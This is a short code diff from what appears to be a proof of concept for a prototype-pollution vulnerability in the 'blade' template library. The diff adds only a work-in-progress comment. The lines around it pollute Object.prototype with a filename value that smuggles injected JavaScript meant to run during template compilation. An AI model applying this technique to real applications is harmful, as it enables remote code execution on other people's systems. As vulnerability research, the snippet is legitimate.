@@ -4,6 +4,7 @@ const blade = require('blade');
  * prototype pollution
  */
 
+// still working on this
 Object.prototype.filename = "xxx\nconsole.log('RCE!')\n"
 Object.prototype.text = "x"
 Object.prototype.name = "x"
